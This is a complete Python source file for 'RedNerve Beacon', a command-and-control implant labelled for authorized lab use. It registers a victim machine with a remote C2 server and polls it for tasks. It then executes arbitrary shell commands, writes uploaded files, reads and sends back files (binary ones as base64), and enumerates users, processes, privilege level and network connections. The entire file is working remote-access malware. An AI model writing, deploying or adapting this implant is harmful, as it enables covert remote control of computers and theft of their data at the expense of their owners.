#!/usr/bin/env python3
"""
RedNerve Beacon — Implant agent for target machines.

Deploy this on victim machines in your authorized lab environment.
It connects back to the RedNerve C2 server, receives tasks, executes
them, and returns results.

Usage:
    python beacon.py --server http://REDNERVE_SERVER:5000 --secret YOUR_BEACON_SECRET
"""
from __future__ import annotations

import argparse
import json
import os
import platform
import socket
import subprocess
import sys
import time
import uuid
import shutil
from pathlib import Path

try:
    import requests
except ImportError:
    # Minimal fallback using urllib
    import urllib.request
    import urllib.error

    class _MinimalRequests:
        """Bare-minimum requests-like wrapper around urllib."""
        class Response:
            def __init__(self, data, status_code):
                self._data = data
                self.status_code = status_code
            def json(self):
                return json.loads(self._data)

        @staticmethod
        def post(url, json=None, headers=None, timeout=30):
            data = json_module.dumps(json).encode() if json else None
            req = urllib.request.Request(url, data=data, headers=headers or {})
            req.add_header("Content-Type", "application/json")
            try:
                resp = urllib.request.urlopen(req, timeout=timeout)
                return _MinimalRequests.Response(resp.read().decode(), resp.status)
            except urllib.error.HTTPError as e:
                return _MinimalRequests.Response(e.read().decode(), e.code)

        @staticmethod
        def get(url, headers=None, timeout=30):
            req = urllib.request.Request(url, headers=headers or {})
            try:
                resp = urllib.request.urlopen(req, timeout=timeout)
                return _MinimalRequests.Response(resp.read().decode(), resp.status)
            except urllib.error.HTTPError as e:
                return _MinimalRequests.Response(e.read().decode(), e.code)

    json_module = json
    requests = _MinimalRequests()


BEACON_ID = str(uuid.uuid4())


def get_system_info() -> dict:
    """Gather local system info for registration."""
    info = {
        "beacon_id": BEACON_ID,
        "hostname": socket.gethostname(),
        "os": f"{platform.system()} {platform.release()}",
        "username": os.getenv("USERNAME") or os.getenv("USER", "unknown"),
        "pid": os.getpid(),
        "process_name": sys.executable,
        "integrity": _get_integrity(),
        "metadata": {
            "arch": platform.machine(),
            "python": platform.python_version(),
            "fqdn": socket.getfqdn(),
        },
    }
    # Get IP
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        info["ip_address"] = s.getsockname()[0]
        s.close()
    except Exception:
        info["ip_address"] = "127.0.0.1"

    # Get domain (Windows AD)
    if platform.system() == "Windows":
        try:
            result = subprocess.run(
                ["wmic", "computersystem", "get", "domain"],
                capture_output=True, text=True, timeout=5
            )
            lines = [l.strip() for l in result.stdout.strip().split("\n") if l.strip() and l.strip() != "Domain"]
            info["domain"] = lines[0] if lines else ""
        except Exception:
            info["domain"] = os.getenv("USERDOMAIN", "")
    else:
        # Try to detect domain on Linux
        try:
            result = subprocess.run(["realm", "list", "--name-only"],
                                    capture_output=True, text=True, timeout=5)
            info["domain"] = result.stdout.strip()
        except Exception:
            info["domain"] = ""

    return info


def _get_integrity() -> str:
    """Determine current integrity/privilege level."""
    if platform.system() == "Windows":
        try:
            import ctypes
            return "high" if ctypes.windll.shell32.IsUserAnAdmin() else "medium"
        except Exception:
            return "medium"
    else:
        return "high" if os.geteuid() == 0 else "medium"


# ─── Task Handlers ──────────────────────────────────────────────

def handle_task(task: dict) -> dict:
    """Route a task to the appropriate handler."""
    action = task.get("action", "")
    params = task.get("params", {})
    task_id = task.get("task_id", "")

    handlers = {
        "run_command": handle_run_command,
        "shell": handle_run_command,
        "upload_file": handle_upload_file,
        "download_file": handle_download_file,
        "system_info": handle_system_info,
        "list_directory": handle_list_directory,
        "read_file": handle_read_file,
        "process_list": handle_process_list,
        "network_info": handle_network_info,
    }

    handler = handlers.get(action)
    if not handler:
        return {
            "task_id": task_id,
            "status": "failure",
            "error": f"Unknown action: {action}",
            "data": {},
        }

    try:
        result_data = handler(params)
        return {
            "task_id": task_id,
            "status": "success",
            "data": result_data,
            "error": None,
        }
    except Exception as e:
        return {
            "task_id": task_id,
            "status": "failure",
            "error": str(e),
            "data": {},
        }


def handle_run_command(params: dict) -> dict:
    """Execute a shell command and return output."""
    command = params.get("command", "")
    timeout = params.get("timeout", 120)
    cwd = params.get("cwd")

    if not command:
        raise ValueError("No command provided")

    # Use shell execution
    if platform.system() == "Windows":
        shell_cmd = ["cmd.exe", "/c", command]
    else:
        shell_cmd = ["/bin/sh", "-c", command]

    result = subprocess.run(
        shell_cmd,
        capture_output=True,
        text=True,
        timeout=timeout,
        cwd=cwd,
    )

    return {
        "stdout": result.stdout,
        "stderr": result.stderr,
        "exit_code": result.returncode,
        "command": command,
    }


def handle_upload_file(params: dict) -> dict:
    """Write content to a file on the target."""
    path = params.get("path", "")
    content = params.get("content", "")
    is_binary = params.get("binary", False)

    if not path:
        raise ValueError("No path provided")

    mode = "wb" if is_binary else "w"
    data = content.encode() if is_binary and isinstance(content, str) else content

    with open(path, mode) as f:
        f.write(data)

    stat = os.stat(path)
    return {
        "path": path,
        "size": stat.st_size,
        "written": True,
    }


def handle_download_file(params: dict) -> dict:
    """Read a file from the target and return its contents."""
    path = params.get("path", "")
    max_size = params.get("max_size", 10 * 1024 * 1024)  # 10MB default

    if not path:
        raise ValueError("No path provided")

    if not os.path.exists(path):
        raise FileNotFoundError(f"File not found: {path}")

    stat = os.stat(path)
    if stat.st_size > max_size:
        raise ValueError(f"File too large: {stat.st_size} bytes (max {max_size})")

    try:
        with open(path, "r") as f:
            content = f.read()
        binary = False
    except UnicodeDecodeError:
        import base64
        with open(path, "rb") as f:
            content = base64.b64encode(f.read()).decode()
        binary = True

    return {
        "path": path,
        "content": content,
        "size": stat.st_size,
        "binary": binary,
    }


def handle_system_info(params: dict) -> dict:
    """Gather detailed system information."""
    info = {
        "hostname": socket.gethostname(),
        "fqdn": socket.getfqdn(),
        "os": platform.platform(),
        "arch": platform.machine(),
        "username": os.getenv("USERNAME") or os.getenv("USER", "unknown"),
        "pid": os.getpid(),
        "cwd": os.getcwd(),
        "home": str(Path.home()),
    }

    # Get environment variables (filtered for interesting ones)
    interesting_vars = [
        "PATH", "HOME", "USER", "USERNAME", "USERDOMAIN", "COMPUTERNAME",
        "LOGNAME", "SHELL", "TERM", "LANG", "HOSTNAME",
    ]
    info["env"] = {k: os.environ.get(k, "") for k in interesting_vars if os.environ.get(k)}

    return info


def handle_list_directory(params: dict) -> dict:
    """List directory contents."""
    path = params.get("path", ".")

    entries = []
    for entry in os.scandir(path):
        try:
            stat = entry.stat()
            entries.append({
                "name": entry.name,
                "is_dir": entry.is_dir(),
                "size": stat.st_size if not entry.is_dir() else 0,
                "modified": stat.st_mtime,
            })
        except PermissionError:
            entries.append({"name": entry.name, "is_dir": entry.is_dir(), "error": "permission denied"})

    return {"path": path, "entries": entries, "count": len(entries)}


def handle_read_file(params: dict) -> dict:
    """Read file contents (alias for download_file with text focus)."""
    return handle_download_file(params)


def handle_process_list(params: dict) -> dict:
    """List running processes."""
    if platform.system() == "Windows":
        result = subprocess.run(
            ["tasklist", "/fo", "csv", "/nh"],
            capture_output=True, text=True, timeout=30
        )
        processes = []
        for line in result.stdout.strip().split("\n"):
            parts = [p.strip('"') for p in line.split('","')]
            if len(parts) >= 5:
                processes.append({
                    "name": parts[0], "pid": parts[1],
                    "session": parts[2], "mem": parts[4],
                })
    else:
        result = subprocess.run(
            ["ps", "aux", "--no-headers"] if shutil.which("ps") else ["ps", "aux"],
            capture_output=True, text=True, timeout=30
        )
        processes = []
        for line in result.stdout.strip().split("\n"):
            parts = line.split(None, 10)
            if len(parts) >= 11:
                processes.append({
                    "user": parts[0], "pid": parts[1],
                    "cpu": parts[2], "mem": parts[3],
                    "command": parts[10],
                })

    return {"processes": processes, "count": len(processes)}


def handle_network_info(params: dict) -> dict:
    """Gather network interface and connection info."""
    info = {"interfaces": [], "connections": []}

    if platform.system() == "Windows":
        r = subprocess.run(["ipconfig", "/all"], capture_output=True, text=True, timeout=15)
        info["raw_interfaces"] = r.stdout
        r2 = subprocess.run(["netstat", "-an"], capture_output=True, text=True, timeout=15)
        info["raw_connections"] = r2.stdout
    else:
        r = subprocess.run(["ip", "addr"] if shutil.which("ip") else ["ifconfig"],
                           capture_output=True, text=True, timeout=15)
        info["raw_interfaces"] = r.stdout
        r2 = subprocess.run(["ss", "-tlnp"] if shutil.which("ss") else ["netstat", "-tlnp"],
                            capture_output=True, text=True, timeout=15)
        info["raw_connections"] = r2.stdout

    return info


# ─── Main Loop ──────────────────────────────────────────────────

class BeaconClient:
    def __init__(self, server_url: str, secret: str, interval: int = 5):
        self.server_url = server_url.rstrip("/")
        self.secret = secret
        self.interval = interval
        self.beacon_id = BEACON_ID
        self.headers = {
            "X-Beacon-Secret": self.secret,
            "Content-Type": "application/json",
        }

    def register(self):
        """Register with the C2 server."""
        info = get_system_info()
        resp = requests.post(
            f"{self.server_url}/api/beacon/register",
            json=info,
            headers=self.headers,
            timeout=10,
        )
        data = resp.json()
        if data.get("beacon_id"):
            self.beacon_id = data["beacon_id"]
        print(f"[*] Registered as {self.beacon_id} on {info['hostname']}")
        return data

    def checkin(self) -> list[dict]:
        """Check in with the server and get pending tasks."""
        resp = requests.post(
            f"{self.server_url}/api/beacon/{self.beacon_id}/checkin",
            json={},
            headers=self.headers,
            timeout=35,  # slightly longer than server long-poll timeout
        )
        data = resp.json()
        return data.get("tasks", [])

    def send_result(self, task_id: str, result: dict):
        """Send task result back to the server."""
        requests.post(
            f"{self.server_url}/api/beacon/{self.beacon_id}/result",
            json={"task_id": task_id, **result},
            headers=self.headers,
            timeout=10,
        )

    def run(self):
        """Main beacon loop."""
        print(f"[*] RedNerve Beacon starting...")
        print(f"[*] Server: {self.server_url}")
        print(f"[*] Interval: {self.interval}s")

        # Register
        while True:
            try:
                self.register()
                break
            except Exception as e:
                print(f"[!] Registration failed: {e}, retrying in {self.interval}s...")
                time.sleep(self.interval)

        # Main loop
        while True:
            try:
                tasks = self.checkin()
                for task in tasks:
                    task_id = task.get("task_id", "unknown")
                    print(f"[>] Executing task {task_id}: {task.get('action')}")
                    result = handle_task(task)
                    print(f"[<] Task {task_id}: {result.get('status')}")
                    self.send_result(task_id, result)
            except KeyboardInterrupt:
                print("\n[*] Beacon shutting down.")
                break
            except Exception as e:
                print(f"[!] Error: {e}")
                time.sleep(self.interval)


def main():
    parser = argparse.ArgumentParser(description="RedNerve Beacon")
    parser.add_argument("--server", required=True, help="C2 server URL (e.g. http://10.0.0.1:5000)")
    parser.add_argument("--secret", required=True, help="Beacon authentication secret")
    parser.add_argument("--interval", type=int, default=5, help="Check-in interval in seconds")
    args = parser.parse_args()

    client = BeaconClient(args.server, args.secret, args.interval)
    client.run()


if __name__ == "__main__":
    main()
